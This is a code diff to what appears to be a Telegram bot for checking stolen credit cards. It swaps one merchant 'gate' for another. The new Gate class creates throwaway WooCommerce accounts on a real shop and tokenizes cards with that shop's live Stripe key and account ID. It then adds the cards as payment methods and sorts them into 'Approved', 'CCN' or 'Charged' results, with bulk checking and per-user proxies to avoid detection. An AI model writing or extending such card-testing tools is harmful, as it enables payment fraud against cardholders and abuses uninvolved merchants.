@@ -1,17 +1,140 @@
-import re
-import json
-import requests
+import requests, re, random, string, json, time, sys, threading
 import asyncio
-from time import time
 from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
 from pyrogram.enums import ChatType
-import random
-import string
+import os
 
-# Stripe Auth API Config
-STRIPE_API_URL = "https://api.stripe.com/v1/payment_methods"
-STRIPE_PK = "pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A"
+# Import proxy helper
+try:
+    from BOT.tools.proxy import get_proxy
+except:
+    def get_proxy(user_id):
+        """Fallback if proxy module not available"""
+        try:
+            if os.path.exists("DATA/proxy.json"):
+                with open("DATA/proxy.json", "r") as f:
+                    data = json.load(f)
+                return data.get(str(user_id))
+        except:
+            return None
+
+P_URL = "" 
+
+S_PK = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
+S_ACC = 'acct_1Mpulb2El1QixccJ'
+
+class Gate:
+    def __init__(self, proxy=None):
+        self.s = requests.Session()
+        if proxy:
+            self.s.proxies = {'http': proxy, 'https': proxy}
+        elif P_URL:
+            self.s.proxies = {'http': P_URL, 'https': P_URL}
+            
+        self.s.headers.update({
+            'authority': 'redbluechair.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'origin': 'https://redbluechair.com',
+            'referer': 'https://redbluechair.com/my-account/',
+            'upgrade-insecure-requests': '1',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"'
+        })
+
+    def rnd_str(self, l=10):
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
+
+    def reg(self):
+        try:
+            r1 = self.s.get('https://redbluechair.com/my-account/')
+            n = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text).group(1)
+            rnd = self.rnd_str()
+            dt = {
+                'email': f'user{rnd}@gmail.com',
+                'password': f'Pass{rnd}!!',
+                'register': 'Register',
+                'woocommerce-register-nonce': n,
+                '_wp_http_referer': '/my-account/'
+            }
+            r2 = self.s.post('https://redbluechair.com/my-account/', data=dt)
+            return "Log out" in r2.text
+        except:
+            return False
+
+    def tok(self, cc, mm, yy, cvv):
+        try:
+            h = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': self.s.headers['user-agent']
+            }
+            d = {
+                'type': 'card',
+                'card[number]': cc,
+                'card[cvc]': cvv,
+                'card[exp_year]': yy,
+                'card[exp_month]': mm,
+                'key': S_PK,
+                '_stripe_account': S_ACC,
+                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
+                'referrer': 'https://redbluechair.com',
+                'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
+                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
+                'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
+            }
+            # Stripe Tokenization (No Proxy Here Always)
+            r = requests.post('https://api.stripe.com/v1/payment_methods', headers=h, data=d)
+            return r.json().get('id')
+        except:
+            return None
+
+    def add(self, pm):
+        try:
+            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/')
+            txt = r1.text
+            n = None
+            m1 = re.search(r'"createSetupIntentNonce":"([^"]+)"', txt)
+            if m1: n = m1.group(1)
+            if not n:
+                m2 = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', txt)
+                if m2: n = m2.group(1)
+            if not n:
+                m3 = re.search(r'"create_setup_intent_nonce":"([a-z0-9]+)"', txt)
+                if m3: n = m3.group(1)
+            
+            if not n: return "Error"
+
+            h = self.s.headers.copy()
+            h.update({'x-requested-with': 'XMLHttpRequest', 'referer': 'https://redbluechair.com/my-account/add-payment-method/'})
+            
+            pl = {
+                'action': (None, 'create_setup_intent'),
+                'wcpay-payment-method': (None, pm),
+                '_ajax_nonce': (None, n)
+            }
+            
+            r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files=pl)
+            js = r2.json()
+            
+            if js.get('success') is True:
+                return "Approved"
+            else:
+                msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
+                return msg
+        except:
+            return "Error"
+
+# ============= Helper Functions =============
 
 user_locks = {}
 
@@ -93,190 +216,6 @@ def extract_card(text):
 def extract_cards(text):
     return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)
 
-def chunk_cards(cards, size):
-    for i in range(0, len(cards), size):
-        yield cards[i:i + size]
-
-def generate_random_string(length=6):
-    return ''.join(random.choices(string.hexdigits.lower(), k=length))
-
-def generate_guid():
-    import uuid
-    return str(uuid.uuid4()) + generate_random_string()
-
-def generate_email():
-    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    return f"{random_str}@gmail.com"
-
-def get_status_and_response(response_data):
-    """Determine status and clean response from API result"""
-    try:
-        if isinstance(response_data, dict):
-            # Check for error
-            if "error" in response_data:
-                error = response_data["error"]
-                code = error.get("code", "")
-                decline_code = error.get("decline_code", "")
-                message = error.get("message", "Error")
-                
-                code_upper = (code + " " + decline_code).upper()
-                
-                if any(kw in code_upper for kw in ["INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS"]):
-                    return "Approved ✅", "Insufficient Funds"
-                elif any(kw in code_upper for kw in ["INCORRECT_CVC", "INVALID_CVC", "CVC"]):
-                    return "CCN ✅", "CVC Error"
-                elif any(kw in code_upper for kw in ["EXPIRED", "EXPIRED_CARD"]):
-                    return "Declined ❌", "Card Expired"
-                elif any(kw in code_upper for kw in ["STOLEN", "LOST", "PICKUP"]):
-                    return "Declined ❌", "Lost/Stolen Card"
-                elif any(kw in code_upper for kw in ["DO_NOT_HONOR", "GENERIC_DECLINE", "CARD_DECLINED"]):
-                    return "Declined ❌", decline_code.replace("_", " ").title() if decline_code else "Card Declined"
-                elif any(kw in code_upper for kw in ["INVALID", "INCORRECT_NUMBER"]):
-                    return "Declined ❌", "Invalid Card"
-                elif any(kw in code_upper for kw in ["FRAUDULENT", "FRAUD"]):
-                    return "Declined ❌", "Fraud Detected"
-                elif any(kw in code_upper for kw in ["AUTHENTICATION", "3D_SECURE", "REQUIRES_ACTION"]):
-                    return "Charged 💎", "3D Secure Required"
-                else:
-                    return "Declined ❌", decline_code.replace("_", " ").title() if decline_code else code.replace("_", " ").title()
-            
-            # Check for success (payment method created)
-            elif "id" in response_data and response_data.get("id", "").startswith("pm_"):
-                return "processing", response_data["id"]
-            
-            # Setup intent response
-            elif "success" in response_data:
-                if response_data.get("success") == True:
-                    return "Charged 💎", "Setup Intent Success"
-                else:
-                    return "Declined ❌", response_data.get("message", "Failed")
-            
-            elif "message" in response_data:
-                msg = response_data["message"].lower()
-                if "success" in msg:
-                    return "Charged 💎", "Success"
-                else:
-                    return "Declined ❌", response_data["message"][:50]
-        
-        return "Declined ❌", str(response_data)[:50]
-    except Exception as e:
-        return "Declined ❌", str(e)[:50]
-
-def create_payment_method_sync(cc, mm, yy, cvv):
-    """Create payment method with Stripe API"""
-    headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-    }
-    
-    # Format year
-    if len(yy) == 4:
-        exp_year = yy[2:]
-    else:
-        exp_year = yy
-    
-    guid = generate_guid()
-    muid = generate_guid()
-    sid = generate_guid()
-    email = generate_email()
-    
-    data = {
-        'type': 'card',
-        'billing_details[name]': 'John Doe',
-        'billing_details[email]': email,
-        'card[number]': cc,
-        'card[cvc]': cvv,
-        'card[exp_month]': mm,
-        'card[exp_year]': exp_year,
-        'guid': guid,
-        'muid': muid,
-        'sid': sid,
-        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
-        'referrer': 'https://wayuumarket.com',
-        'time_on_page': str(random.randint(10000, 30000)),
-        'key': STRIPE_PK,
-    }
-    
-    try:
-        response = requests.post(STRIPE_API_URL, headers=headers, data=data, timeout=60)
-        return response.json()
-    except Exception as e:
-        return {"error": {"message": str(e)}}
-
-def create_setup_intent_sync(payment_method_id):
-    """Create setup intent with WayuuMarket"""
-    cookies = {
-        'cookielawinfo-checkbox-necessary': 'yes',
-        'cookielawinfo-checkbox-functional': 'yes',
-        'cookielawinfo-checkbox-performance': 'yes',
-        'cookielawinfo-checkbox-analytics': 'yes',
-        'cookielawinfo-checkbox-advertisement': 'yes',
-        'cookielawinfo-checkbox-others': 'yes',
-        'viewed_cookie_policy': 'yes',
-    }
-    
-    headers = {
-        'authority': 'wayuumarket.com',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://wayuumarket.com',
-        'referer': 'https://wayuumarket.com/my-account/add-payment-method/',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-    
-    params = {
-        'wc-ajax': 'wc_stripe_create_setup_intent',
-    }
-    
-    nonce = ''.join(random.choices(string.hexdigits.lower(), k=10))
-    
-    data = {
-        'stripe_source_id': payment_method_id,
-        'nonce': nonce,
-    }
-    
-    try:
-        response = requests.post('https://wayuumarket.com/', params=params, cookies=cookies, headers=headers, data=data, timeout=60)
-        return response.json()
-    except Exception as e:
-        return {"error": {"message": str(e)}}
-
-def check_stripe_auth(cc, mm, yy, cvv):
-    """Full Stripe Auth check"""
-    # Step 1: Create payment method
-    pm_result = create_payment_method_sync(cc, mm, yy, cvv)
-    
-    status, response = get_status_and_response(pm_result)
-    
-    # If payment method creation failed, return error
-    if status != "processing":
-        return status, response
-    
-    # Step 2: Create setup intent
-    payment_method_id = response
-    setup_result = create_setup_intent_sync(payment_method_id)
-    
-    return get_status_and_response(setup_result)
-
 def is_free_user(user_id):
     """Check if user has free plan"""
     try:
@@ -288,6 +227,46 @@ def is_free_user(user_id):
         return plan in ["Free", "Redeem Code"]
     except:
         return True
+
+def check_stripe_auth_sync(cc, mm, yy, cvv, proxy=None):
+    """Synchronous Stripe Auth check using Gate class"""
+    gate = Gate(proxy=proxy)
+    
+    if not gate.reg():
+        return "Declined ❌", "Registration Error"
+    
+    token = gate.tok(cc, mm, yy, cvv)
+    if not token:
+        return "Declined ❌", "Tokenization Error"
+    
+    result = gate.add(token)
+    
+    # Parse result into status and response
+    if result == "Approved":
+        return "Charged 💎", "Approved"
+    elif result == "Error":
+        return "Declined ❌", "Error"
+    else:
+        # Check for specific responses
+        result_lower = result.lower()
+        if "insufficient" in result_lower:
+            return "Approved ✅", "Insufficient Funds"
+        elif "cvc" in result_lower or "security code" in result_lower:
+            return "CCN ✅", "CVC Error"
+        elif "expired" in result_lower:
+            return "Declined ❌", "Card Expired"
+        elif "stolen" in result_lower or "lost" in result_lower:
+            return "Declined ❌", "Lost/Stolen Card"
+        elif "fraudulent" in result_lower or "fraud" in result_lower:
+            return "Declined ❌", "Fraud Detected"
+        elif "authentication" in result_lower or "3d" in result_lower:
+            return "Charged 💎", "3D Secure Required"
+        elif "approved" in result_lower or "success" in result_lower:
+            return "Charged 💎", result
+        else:
+            return "Declined ❌", result
+
+# ============= Command Handlers =============
 
 @Client.on_message(filters.command("au") & ~filters.edited)
 async def stripe_auth_single(client, message):
@@ -350,7 +329,10 @@ async def stripe_auth_single(client, message):
         cc, mm, yy, cvv = extracted
         fullcc = f"{cc}|{mm}|{yy}|{cvv}"
         
-        start_time = time()
+        # Get user's proxy if set
+        user_proxy = get_proxy(int(user_id))
+        
+        start_time = time.time()
         
         loading_msg = await message.reply(
             f"<pre>Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>Stripe Auth</code>",
@@ -359,9 +341,9 @@ async def stripe_auth_single(client, message):
         
         # Run in executor to avoid blocking
         loop = asyncio.get_event_loop()
-        status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv)
+        status, response = await loop.run_in_executor(None, check_stripe_auth_sync, cc, mm, yy, cvv, user_proxy)
         
-        end_time = time()
+        end_time = time.time()
         timetaken = round(end_time - start_time, 2)
         
         profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
@@ -474,9 +456,6 @@ async def stripe_auth_mass(client, message):
         if len(all_cards) > mlimit:
             user_locks.pop(user_id, None)
             
-            # Create button to continue with limit
-            from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-            
             buttons = InlineKeyboardMarkup([
                 [InlineKeyboardButton(
                     f"Continue with {mlimit} cards ✅", 
@@ -486,9 +465,7 @@ async def stripe_auth_mass(client, message):
             ])
             
             # Store cards temporarily for callback
-            import json
             temp_file = f"downloads/temp_cards_{user_id}.json"
-            import os
             os.makedirs("downloads", exist_ok=True)
             with open(temp_file, "w") as f:
                 json.dump(all_cards[:mlimit], f)
@@ -516,6 +493,9 @@ async def stripe_auth_mass(client, message):
             except:
                 pass
         
+        # Get user's proxy if set
+        user_proxy = get_proxy(int(user_id))
+        
         checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
         
         loader_msg = await message.reply(
@@ -526,7 +506,7 @@ async def stripe_auth_mass(client, message):
             reply_to_message_id=message.id
         )
         
-        start_time = time()
+        start_time = time.time()
         final_results = []
         loop = asyncio.get_event_loop()
         
@@ -534,7 +514,7 @@ async def stripe_auth_mass(client, message):
             parts = card.split("|")
             if len(parts) == 4:
                 cc, mm, yy, cvv = parts
-                status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv)
+                status, response = await loop.run_in_executor(None, check_stripe_auth_sync, cc, mm, yy, cvv, user_proxy)
                 
                 final_results.append(
                     f"• <b>Card:</b> <code>{card}</code>\n"
@@ -554,7 +534,7 @@ async def stripe_auth_mass(client, message):
                 except:
                     pass
         
-        end_time = time()
+        end_time = time.time()
         timetaken = round(end_time - start_time, 2)
         
         if available_credits != "∞":
@@ -569,7 +549,6 @@ async def stripe_auth_mass(client, message):
         
         # If message is too long, send as file
         if len(final_text) > 4000:
-            import os
             os.makedirs("downloads", exist_ok=True)
             filename = f"downloads/mau_results_{user_id}.txt"
             
@@ -625,8 +604,6 @@ async def mau_limit_callback(client, callback):
         user_locks[user_id] = True
         
         # Load stored cards
-        import json
-        import os
         temp_file = f"downloads/temp_cards_{user_id}.json"
         
         if not os.path.exists(temp_file):
@@ -656,6 +633,9 @@ async def mau_limit_callback(client, callback):
             except:
                 pass
         
+        # Get user's proxy if set
+        user_proxy = get_proxy(int(user_id))
+        
         checked_by = f"<a href='tg://user?id={user_id}'>{callback.from_user.first_name}</a>"
         
         await callback.message.edit_text(
@@ -665,9 +645,7 @@ async def mau_limit_callback(client, callback):
             f"<b>[⚬] Status:</b> <code>Processing...</code>"
         )
         
-        from time import time
-        import asyncio
-        start_time = time()
+        start_time = time.time()
         final_results = []
         loop = asyncio.get_event_loop()
         
@@ -675,7 +653,7 @@ async def mau_limit_callback(client, callback):
             parts = card.split("|")
             if len(parts) == 4:
                 cc, mm, yy, cvv = parts
-                status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv)
+                status, response = await loop.run_in_executor(None, check_stripe_auth_sync, cc, mm, yy, cvv, user_proxy)
                 
                 final_results.append(
                     f"• <b>Card:</b> <code>{card}</code>\n"
@@ -695,7 +673,7 @@ async def mau_limit_callback(client, callback):
                 except:
                     pass
         
-        end_time = time()
+        end_time = time.time()
         timetaken = round(end_time - start_time, 2)
         
         if available_credits != "∞":
